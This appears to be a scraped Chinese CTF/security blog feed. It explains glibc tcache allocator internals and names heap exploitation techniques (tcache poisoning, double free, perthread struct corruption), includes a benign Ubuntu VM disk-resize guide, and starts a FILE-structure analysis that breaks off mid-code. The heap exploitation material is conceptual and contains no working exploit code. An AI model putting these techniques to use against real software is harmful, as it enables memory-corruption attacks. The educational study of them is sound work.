Tcachebin</h2><p>从宏观来看，<strong>Tcachebin</strong>的各项操作与<strong>Fastbin</strong>大同小异，如<strong>FILO</strong>(先进后出)的单循环链表、精确分配(不切割)、<strong>free</strong>后为防止合并后一个堆块的<strong>inuse</strong>位不置<strong>0</strong>等。<br>但在细节上仍存在些许差异，如<strong>Fastbin</strong>中<strong>fd</strong>是指向链表中下一个堆块的堆头，而<strong>Tcachebin</strong>中<strong>fd</strong>则是直接指向链表中下一个堆块的<strong>fd</strong>。除此之外，在从<strong>Tcachebin</strong>中申请回内存块时，<strong>并没有特定的代码去检验该内存块的大小是否与这条Tcachebin所管理的大小相吻合！</strong><br>以上两点差异意味着在<strong>Tcachebin</strong>中利用类似<strong>Fastbin Attack</strong>的技巧时，不需要再去找到合适的地址伪造<strong>size</strong>位，不需要再去计算堆头到<strong>data</strong>区域的偏移，而是<strong>指哪儿打哪儿</strong>(<strong>fd</strong>伪造到哪里，之后写的就是哪里)。</p><ul><li><strong>free</strong></li></ul><p>在该机制中释放大小低于<strong>0x400</strong>字节的堆块时会首先放入<strong>Tcachebin</strong>，而不是原来的<strong>Fastbin</strong>或<strong>Unsortbin</strong>。当对应大小的<strong>Tcachebin</strong>中放满<strong>7</strong>个空闲堆块后，下一次<strong>free</strong>的堆块才会放入对应的<strong>Fastbin</strong>或<strong>Unsortbin</strong>中。在放入<strong>Tcachebin</strong>时会调用<strong>tcache_put</strong>函数，其代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcache_put(mchunkptr chunk , <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line">    assert(tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，就是将<strong>free</strong>的堆块插入<strong>Tcachebin</strong>的前端，将<strong>fd</strong>指向前一个堆块，并将对应的<strong>tcache_entry</strong>指向当前堆块，再将<strong>count+1</strong>。</p><ul><li><strong>malloc</strong></li></ul><p>相对应与内存释放，内存申请会遇到很多种不同的内存布局情况。在申请大小低于<strong>0x400</strong>的堆块时，首先会考虑从<strong>Tcachebin</strong>中去寻找。如上文中提到的，从<strong>Tcachebin</strong>中取出堆块时的逻辑除了不会检查<strong>size</strong>位之外，几乎与<strong>Fastbin</strong>相同，只会进行精准匹配，不会进行切割，在取出时会调用<strong>tcache_get</strong>函数，其代码入下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcache_get(<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">    assert(tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">    assert(tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若对应大小的<strong>Tcachebin</strong>为空，则会从对应大小的<strong>bin</strong>中去寻找(寻找顺序同之前版本)。在这种情况下，即<strong>Tcachebin</strong>未满时，却从<strong>Fastbin/Smallbin</strong>中取出堆块，则会将链上的其他堆块都链入<strong>Tcachebin</strong>中。其具体算法是首先将<strong>Fastbin/Smallbin</strong>中取出的堆块指针进行保存，并判断该大小对应的<strong>Tcachebin</strong>是否未满，若未满则将其之后的堆块按照<strong>Fastbin/Smallbin</strong>的分配顺序将堆块链入<strong>Tcachebin</strong>中，直到对应大小的<strong>Tcachebin</strong>放满或<strong>Fastbin/Smallbin</strong>的链为空，最后将<strong>之前取出的堆块指针</strong>返回给用户使用。由于是按照<strong>Fastbin/Smallbin</strong>的分配顺序将堆块放入<strong>Tcachebin</strong>中，因此不难判断，最从<strong>Tcachebin</strong>中申请的堆块顺序是与正常从<strong>Fastbin/Smallbin</strong>中申请堆块顺序时反向的。</p><blockquote><ul><li>关于将<strong>Fastbin/Smallbin</strong>中堆块放入<strong>Tcachebin</strong>中的操作<br>针对这个<strong>Tcachebin</strong>未满，放入堆块的操作，之前在网上看到大部分的描述都是先把大小相同的堆块从<strong>Fastbin/Smallbin</strong>中放入<strong>Tcachebin</strong>后再进行分配，但在进行调试的时候发现跟这个描述略有出入，不是很理解，于是通过阅读<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener"><strong>源码</strong></a>可以非常清楚地看到整个操作的逻辑。</li></ul><p><strong>Fastbin：3594</strong>行保存了<strong>Fastbin</strong>中即将分配的指针，<strong>3608-3631</strong>行将其后的堆块按<strong>Fastbin</strong>的申请顺序(<strong>FILO</strong>)放入<strong>Tcachebin</strong>，<strong>3632</strong>行将第<strong>3594</strong>行保存的指针返回给用户使用。<br><strong>Smallbin：3652</strong>行保存了<strong>Smallbin</strong>中即将分配的指针，<strong>3664-3689</strong>行将其后的堆块按<strong>Smallbin</strong>的申请顺序(<strong>FIFO</strong>)放入<strong>Tcachebin</strong>，<strong>3690</strong>行将第<strong>3652</strong>行保存的指针放回给用户使用。<br>下面以<strong>Fastbin</strong>为例，贴出简化后的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">if</span>(nb &lt;= get_max_fast())                                            <span class="comment">//申请范围在Fastbin之内</span></span><br><span class="line">&gt;&#123;</span><br><span class="line">   idx = fastbin_index(nb);                                       <span class="comment">//找到对应大小的Fastbin索引</span></span><br><span class="line">   mfastbinptr *fb = &amp;fastbin(av , idx);                 <span class="comment">//通过索引找到入口</span></span><br><span class="line">   victim = *fb;                                                         <span class="comment">//注意这里，保存了第一个即将分配堆块的指针</span></span><br><span class="line">   <span class="keyword">if</span>(victim != <span class="literal">NULL</span>)                                                <span class="comment">//如果Fastbin中有堆块</span></span><br><span class="line">   &#123;</span><br><span class="line">       *fb = victim-&gt;fd;                                            <span class="comment">//此时fb为即将分配堆块的fd</span></span><br><span class="line">       ............</span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">       ............</span><br><span class="line">       <span class="keyword">while</span>(tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">       &#123;                                                                      <span class="comment">//直到Tcachebin放满，或Fastbin取空为止</span></span><br><span class="line">           *fb = tc_victim-&gt;fd;                                  <span class="comment">//循环遍历</span></span><br><span class="line">           ............</span><br><span class="line">           tcache_put(tc_victim , tc_idx);                <span class="comment">//将该堆块放入Tcachebin中</span></span><br><span class="line">       &#125;</span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       <span class="keyword">void</span> *p = chunk2mem(victim);                  <span class="comment">//注意这里的victim为最开始保存的即将分配的堆块、</span></span><br><span class="line">       <span class="keyword">return</span> p;                                                      <span class="comment">//返回给用户使用</span></span><br><span class="line">   &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><h2 id="0x03-How-To-Pwn"><a href="#0x03-How-To-Pwn" class="headerlink" title="0x03 How To Pwn"></a>0x03 How To Pwn</h2><p>由于这方面的题目接触的不算特别多，目前就只从大佬的博客上了解了一些基础的利用方法，可能以后会遇到再进行更详细和深入的归纳总结吧。</p><ul><li><strong>Tcache poisoning</strong></li></ul><p>在上一部分中也提到过这种方法。与<strong>Fastbin Attack</strong>类似，篡改<strong>Tcachebin</strong>中的<strong>fd</strong>字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与<strong>Fastbin</strong>相比，<strong>Tcachebin</strong>中为了得到更高的效率而舍去了安全性，在进行申请时没有对<strong>size</strong>位进行校验，而且由于<strong>Tcachebin</strong>中的<strong>fd</strong>是指向下一个堆块的<strong>fd</strong>(<strong>Fastbin</strong>的<strong>fd</strong>是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。</p><ul><li><strong>Tcache dup</strong></li></ul><p>这是<strong>Tcache</strong>机制刚推出的几个版本中，在进行<strong>free</strong>操作时没有对这个堆块进行一个安全检测而导致可以对同一个堆块进行多次<strong>free</strong>，那么就会变成一个<strong>Tcachebin</strong>链上链了两个相同的堆块(我指向我自己)，后面也就不用多说了。但值得一提的是在<strong>libc-2.29</strong>版本中加入了检查机制(<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener"><strong>源码</strong></a>的<strong>4201-4216</strong>行)，会在堆块进行<strong>free</strong>时检查这个堆块是否已经存在于这条链上，如果存在则会报<strong>“free():double free detected in tcache 2”</strong>的错误，因此这种直接<strong>double free</strong>利用方式存在于<strong>libc-2.26</strong>至<strong>libc-2.28</strong>的版本中。</p><ul><li><strong>Tcache perthread corruption</strong></li></ul><p>在最开始介绍结构体时提到的<strong>tcache_perthread_struct</strong>结构体，该结构体<strong>size</strong>为<strong>0x250</strong>，是管理整个<strong>Tcachebin</strong>的结构体，如果对这个结构体有写权限，那么可以控制任意大小<strong>Tcachebin</strong>的入口地址。</p><ul><li><strong>U2T</strong></li></ul><p><strong>U2T</strong>即<strong>Unsortbin 2 Tcachebin</strong>，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合<strong>Off By One</strong>或<strong>Off By NULL</strong>的漏洞，使<strong>Unsortbin</strong>在合并过程中将中间的<strong>Tcachebin</strong>合并，从而达到修改<strong>fd</strong>字段的效果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu虚拟机扩容 Step by Step</title>
      <link href="/2020/03/12/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%20Step%20by%20Step/"/>
      <url>/2020/03/12/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%20Step%20by%20Step/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-写在前面的一堆废话"><a href="#0x00-写在前面的一堆废话" class="headerlink" title="0x00 写在前面的一堆废话"></a>0x00 写在前面的一堆废话</h2><p>去年第一次把虚拟机磁盘空间<strong>20G</strong>用满进行扩容时折腾了好久，还请教了好多大狮虎，在参考各种博客、文章，经历了恢复快照x<strong>N</strong>，把虚拟机搞成命令行等艰难坎坷后终于成功扩容到<strong>40G</strong>，后来<strong>40G</strong>又到<strong>60G</strong>，一直都没有记录，恐忘，故以此文以记之。</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/8447551-bab8e5a94961f76b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h2 id="0x01-扩容"><a href="#0x01-扩容" class="headerlink" title="0x01 扩容"></a>0x01 扩容</h2><p>这次把<strong>60G</strong>扩到<strong>100G</strong><br>1、先将虚拟机关机，在设置里面点击扩展，将大小改成扩容后的大小。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-f3cca5db0c5e235c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/8447551-b5b198418a5de4dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>2、打开虚拟机发现剩余空间并没有变化。其实正如上图说的，磁盘已经扩展了，但我们还需要从虚拟机内部对磁盘进行分区和扩展文件系统。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-731d2c427cd17786.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>3、这时就需要用到<strong>gparted</strong>工具了，一个图形化的分区工具，直接可以通过<strong>sudo apt-get install gparted</strong>命令下载，其界面如下。可以看到除了之前的<strong>60G</strong>之外，我们又多出了<strong>40G</strong>的未分配空间。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-c31c00a1db8c968f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="gparted"><br>4、直接点击调整<strong>/dev/sda1</strong>大小效果如下图所示，并没有多余的扩展空间。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4c3b8b5fb1a6c0e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="/dev/sda1"><br>5、将<strong>/dev/sda2</strong>扩展分区删除后，之前的扩展分区空间被合并到了未分配的<strong>40G</strong>中。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-1378c2333464e139.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>6、右键点击未分配空间创建新分区，前<strong>40G</strong>初始化为主分区，最后剩出<strong>1G</strong>留为新的扩展分区。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-60ae47cc0b3f6338.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>7、主分区初始化完后大概长这样。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-97c0603af092535e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>8、此时将刚刚的<strong>1G</strong>的未分配分区初始化为扩展分区。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-bf31a30582f5da35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>9、初始化完扩展分区后，又出现一个未分配分区，将其初始化为逻辑分区，文件系统为<strong>linux-swap</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-bf57e70d64effacf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>10、全部初始化完后大概长这样。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-764df0967b56853b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>11、将之前初始化为主分区的<strong>40G</strong>删除，使其变成未分配分区。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-daef3cd1fe3d3755.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>12、这时，我们再去修改<strong>/dev/sda1</strong>大小，发现可以多<strong>40G</strong>，将其全部分配给<strong>/dev/sda1</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-cadc81d7fb686ab9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>13、分配完后大概长这样，但还没结束。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-593951a1b718beac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>14、最后要点上面这个小勾勾√，应用刚刚的修改。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-256e79d3a2460233.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>15、完成，锵锵！<br><img src="https://upload-images.jianshu.io/upload_images/8447551-bed48582d79fedd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="扩容后"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FILE结构体及漏洞利用方法</title>
      <link href="/2020/03/12/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2020/03/12/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次接触<strong>FILE</strong>结构体，是在<a href="https://www.jianshu.com/p/e1effb2e046e" target="_blank" rel="noopener"><strong>BCTF2018</strong>的<strong>baby_arena</strong></a>中，利用了<strong>FSOP</strong>，当时感觉结构体中字段太多了，没有理清楚到底是什么关系。也是时隔非常非常非常久，咸鱼的我终于开始系统的学习一下<strong>FILE</strong>结构体。本篇基于<strong>libc-2.27</strong>源码对该版本文件流的数据结构、相关操作以及一些常见的漏洞利用方法进行分析。</p><a id="more"></a><h2 id="0x01-数据结构"><a href="#0x01-数据结构" class="headerlink" title="0x01 数据结构"></a>0x01 数据结构</h2><ul><li><strong>_IO_FILE_plus</strong></li></ul><p>虽然每次都是说<strong>FILE</strong>结构体，但其实<strong>FILE</strong>结构体的外层还有一个结构体，叫做<strong>_IO_FILE_plus</strong>结构体。该结构体在<strong>glibc/libio/libioP.h</strong>中定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FILE file;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间包含了一个我们常说的<strong>FILE</strong>结构体，以及<strong>_IO_jump_t</strong>的一个虚表结构体。</p><ul><li><strong>FILE/_IO_FILE</strong><br>在<strong>glibc/libio/bits/types/FILE.h</strong>中可以看到<strong>FILE</strong>结构体其实就是<strong>_IO_FILE</strong>结构体。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>_IO_FILE</strong>结构体在<strong>glibc/libio/bits/libio.h</strong>中定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> _flags;  <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_read_end;      <span class="comment">/* End of get area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_read_base;    <span class="comment">/* Start of puback+get area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_base;   <span class="comment">/* Start of put area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_ptr;      <span class="comment">/* Current put pointer. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_base;     <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_end;      <span class="comment">/* End of reserve area. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_save_base;           <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_backup_base;      <span class="comment">/* Pointer to first valid character of backup area. */</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_save_end;            <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">    <span class="keyword">int</span> _fileno;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">int</span> _flags2;</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">size_t</span> __pad5;</span><br><span class="line">    <span class="keyword">int</span> _mode;</span><br><span class="line">    <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span>*) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<strong>_flags</strong>字段标志了该<strong>FILE</strong>结构体的读写等属性，该字段的前<strong>2</strong>个字节固定为<strong>0xFBAD</strong>的魔术头，其具体数值在<strong>glibc/libio/libio.h</strong>中进行宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don't deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don't call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br></pre></td></tr></table></figure><p><strong>_IO_read_ptr</strong>字段为输入缓冲区的当前地址<br><strong>_IO_read_end</strong>字段为输入缓冲区的结束地址<br><strong>_IO_read_base</strong>字段为输入缓冲区的起始地址<br><strong>_IO_write_base</strong>字段为输出缓冲区的起始地址<br><strong>_IO_write_ptr</strong>字段为输出缓冲区的当前地址<br><strong>_IO_write_end</strong>字段为输出缓冲区的结束地址<br><strong>_IO_buf_base</strong>字段为输入输出缓冲区的起始地址<br><strong>_IO_buf_end</strong>字段为输入输出缓冲区的结束地址<br><strong>_chain</strong>字段为指向下一个<strong>_IO_FILE</strong>结构体的指针，在<strong>gilbc/libio/libioP.h</strong>中有如下声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>该变量为一个单链表的头结点，该单链表用于管理程序中所有的<strong>FILE</strong>结构体，并通过<strong>_chain</strong>字段索引下一个<strong>FILE</strong>结构体，每个程序中该链表的最后<strong>3</strong>个节点从后往前固定为<strong>_IO_2_1_stdin</strong>、<strong>_IO_2_1_stdout</strong>、<strong>_IO_2_1_stderr</strong>，之前是用户新申请的<strong>FILE</strong>结构体，每次新申请的<strong>FILE</strong>结构体会插在该链表的表头。大概长成下面这样：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5657d087535a591e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_list_all"><br>值得注意的是，在<strong>_IO_FILE</strong>结构体定义的内部有一个宏<code>#ifdef _IO_USE_OLD_IO_FILE</code>，如果不存在<strong>_IO_USE_OLD_IO_FILE</strong>的宏定义，则会将后面的<strong>}</strong>以及下一个结构体<strong>_IO_FILE_complete</strong>的定义头给跳过，即扩充了<strong>_IO_FILE</strong>结构体，使其拥有了更多的字段。<strong>_IO_2_1_stdin</strong>、<strong>_IO_2_1_stdout</strong>、<strong>_IO_2_1_stderr</strong>的<strong>FILE</strong>结构体均为扩展后的。比如某次调试中的<strong>_IO_2_1_stdout</strong>结构如下(从<strong>_lock</strong>之后到<strong>vtable</strong>之前的字段均为扩展后的)：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-7d1b3a44a5afee73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_2_1_stdin_"></p><ul><li><strong>_IO_jump_t</strong><br>该结构体在<strong>glibc/libio/libioP.h</strong>中定义如下:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    